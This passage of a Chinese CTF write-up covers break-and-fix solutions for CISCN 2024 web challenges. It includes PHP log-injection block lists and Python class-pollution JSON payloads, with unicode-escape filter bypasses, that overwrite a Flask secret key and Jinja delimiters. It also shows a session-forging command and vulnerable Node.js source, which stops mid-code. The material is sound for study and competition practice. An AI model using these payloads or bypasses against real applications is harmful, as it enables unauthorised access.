src="/img/wp/2024/2024ciscn-%E7%B2%97%E5%BF%83%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98-BREAK_1.png"></p><p>或者写入一个换行后在xff中执行命令</p><h2 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h2><p>对于写入日志的两个参数添加黑名单</p><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;default_info_auto_recovery.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]?:<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br><br><span class="hljs-comment">// 修改点1</span><br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;//&quot;</span>,<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>];<br><span class="hljs-variable">$p</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$blacklist</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$p</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\?|php|\&gt;|:/i&quot;</span>,<span class="hljs-variable">$p</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="hljs-title function_ invoke__">time</span>());<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> &amp;&amp; <span class="hljs-variable">$id</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello,&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$username</span>&quot;</span>;<br><br>    <span class="hljs-comment">// 修改点2</span><br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;//&quot;</span>,<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>];<br>    <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$blacklist</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$username</span>);<br><br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;//登陆时间<span class="hljs-subst">$time</span>,<span class="hljs-subst">$username</span> <span class="hljs-subst">$p</span>&quot;</span>;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>).<span class="hljs-variable">$str</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO ACCESS&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;br&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;js/jquery-1.9.0.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;js/jquery.base64.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;script&gt;<br> ....<br>&lt;/script&gt;<br>更改用户名&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;newusername&quot;</span> id=<span class="hljs-string">&quot;newusername&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>&gt;<br>&lt;button type=<span class="hljs-string">&quot;submit&quot;</span> onclick=<span class="hljs-string">&quot;submitData()&quot;</span> &gt;更改&lt;/button&gt;<br></code></pre></td></tr></table></figure><h1 id="web-Polluted"><a href="#web-Polluted" class="headerlink" title="web-Polluted"></a>web-Polluted</h1><h2 id="break-2"><a href="#break-2" class="headerlink" title="break"></a>break</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, redirect, url_for,request,render_template<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_md5</span>():<br>    random_string = os.urandom(<span class="hljs-number">16</span>)<br>    md5_hash = hashlib.md5(random_string)<br><br>    <span class="hljs-keyword">return</span> md5_hash.hexdigest()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">user_input</span>):<br>    blacklisted_patterns = [<span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>]<br>    <span class="hljs-keyword">for</span> pattern <span class="hljs-keyword">in</span> blacklisted_patterns:<br>        <span class="hljs-keyword">if</span> re.search(pattern, user_input, re.IGNORECASE):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># Recursive merge function</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>app = Flask(__name__)<br>app.secret_key = generate_random_md5()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    session[<span class="hljs-string">&quot;username&quot;</span>] = username<br>    session[<span class="hljs-string">&quot;password&quot;</span>] = password<br>    Evil = evil()<br>    <span class="hljs-keyword">if</span> request.data:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>(request.data)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            merge(json.loads(request.data), Evil)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">templates</span>():<br>    username = session.get(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-literal">None</span>)<br>    password = session.get(<span class="hljs-string">&quot;password&quot;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">if</span> username <span class="hljs-keyword">and</span> password:<br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;adminer&quot;</span> <span class="hljs-keyword">and</span> password == app.secret_key:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;important.html&quot;</span>, flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>).read())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unauthorized&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Hello,  This is the POLLUTED page.&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="hljs-literal">True</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>python原型链污染secret_key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;app&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;secret_key&quot;</span>: <span class="hljs-string">&quot;dr0n111&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>有关键字被过滤了，转成unicode绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;\u0061\u0070\u0070&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;\u0073\u0065\u0063\u0072\u0065\u0074\u005f\u006b\u0065\u0079&quot;</span>: <span class="hljs-string">&quot;dr0n111&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>污染后伪造key登录</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;dr0n111&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;</span>password&#x27;:<span class="hljs-string">&#x27;dr0n111&#x27;</span>,<span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&#x27;adminer&#x27;</span>&#125;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024ciscn-Polluted_break_1.png"></p><p>登录后看到语法标识符不对，使用<code>variable_start_string</code>替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;app&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;jinja_env&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;variable_start_string&quot;</span>: <span class="hljs-string">&quot;[%&quot;</span>,<br>                    <span class="hljs-string">&quot;variable_end_string&quot;</span>: <span class="hljs-string">&quot;%]&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;\u0061\u0070\u0070&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;\u006a\u0069\u006e\u006a\u0061\u005f\u0065\u006e\u0076&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0073\u0074\u0061\u0072\u0074\u005f\u0073\u0074\u0072\u0069\u006e\u0067&quot;</span>: <span class="hljs-string">&quot;[%&quot;</span>,<br>                    <span class="hljs-string">&quot;\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0065\u006e\u0064\u005f\u0073\u0074\u0072\u0069\u006e\u0067&quot;</span>: <span class="hljs-string">&quot;%]&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为缓存的原因，先污染在访问即可</p><p><img src="/img/wp/2024/2024ciscn-Polluted_break_2.png"></p><h2 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h2><p>增加黑名单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">user_input</span>):<br>    blacklisted_patterns = [<span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;005f&#x27;</span>, <span class="hljs-string">&#x27;0074&#x27;</span>, <span class="hljs-string">&#x27;006c&#x27;</span>, <span class="hljs-string">&#x27;[%&#x27;</span>]<br>    <span class="hljs-keyword">for</span> pattern <span class="hljs-keyword">in</span> blacklisted_patterns:<br>        <span class="hljs-keyword">if</span> re.search(pattern, user_input, re.IGNORECASE):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><h1 id="web-bigfish"><a href="#web-bigfish" class="headerlink" title="web-bigfish"></a>web-bigfish</h1><h2 id="break-3"><a href="#break-3" class="headerlink" title="break"></a>break</h2><p>扫目录得到<code>/admin</code>和<code>/login</code></p><p>访问admin会自动跳转到login，简单修改cookie就能直接登录</p><p>数据储存位置可以穿越目录，读取<code>fish.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-serialize&#x27;</span>);<br><span class="hljs-keyword">const</span> schedule = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-schedule&#x27;</span>);<br><br><span class="hljs-comment">// Change working directory to /srv</span><br>process.<span class="hljs-title function_">chdir</span>(<span class="hljs-string">&#x27;/srv&#x27;</span>);<br><br><br><span class="hljs-keyword">let</span> rule1 = <span class="hljs-keyword">new</span> schedule.<span class="hljs-title class_">RecurrenceRule</span>();<br>rule1.<span class="hljs-property">minute</span> = [<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span> , <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">18</span>, <span class="hljs-number">21</span>, <span class="hljs-number">24</span>, <span class="hljs-number">27</span>, <span class="hljs-number">30</span>, <span class="hljs-number">33</span>, <span class="hljs-number">36</span>, <span class="hljs-number">39</span>, <span class="hljs-number">42</span>, <span class="hljs-number">45</span>, <span class="hljs-number">48</span>, <span class="hljs-number">51</span>, <span class="hljs-number">54</span>, <span class="hljs-number">57</span>];<br><br><span class="hljs-comment">// 定时清除</span><br><span class="hljs-keyword">let</span> job1 = schedule.<span class="hljs-title function_">scheduleJob</span>(rule1, <span class="hljs-function">() =&gt;</span> &#123;<br>fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">&#x27;data.html&#x27;</span>,<span class="hljs-string">&quot;#获取的数据信息\n&quot;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;wriet error&quot;</span>)<br>&#125;);<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-art-template&#x27;</span>))<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span>&#125;))<br><br><br>data_path = <span class="hljs-string">&quot;data.html&quot;</span>;<br><br><span class="hljs-comment">// Middleware to set default cookies for /admin route</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setDefaultAdminCookies</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span>) &#123;<br>        res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;normal&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span>) &#123;<br>        res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;is_admin&#x27;</span>, <span class="hljs-string">&#x27;false&#x27;</span>);<br>    &#125;<br>    <span class="hljs-title function_">next</span>();<br>&#125;<br><br><span class="hljs-comment">//主页</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public/index.html&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)&#123;<br>fs.<span class="hljs-title function_">appendFile</span>(<span class="hljs-string">&#x27;data.html&#x27;</span>,<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(req.<span class="hljs-property">body</span>)+<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">body</span>)<br>&#125;);<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public/index.html&#x27;</span>));<br>&#125;);<br><br><br><span class="hljs-comment">//后台管理</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/admin&#x27;</span>, setDefaultAdminCookies, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br><span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&quot;admin&quot;</span> || req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> !== <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> === <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin.html&#x27;</span>,&#123;<br>            datadir : data_path<br>        &#125;);<br>&#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/admin&#x27;</span>, setDefaultAdminCookies, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br><span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&quot;admin&quot;</span> || req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> !== <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> === <span class="hljs-string">&quot;true&quot;</span>)&#123;<br><span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">newname</span>)&#123;<br>data_path = req.<span class="hljs-property">body</span>.<span class="hljs-property">newname</span>;<br>res.<span class="hljs-title 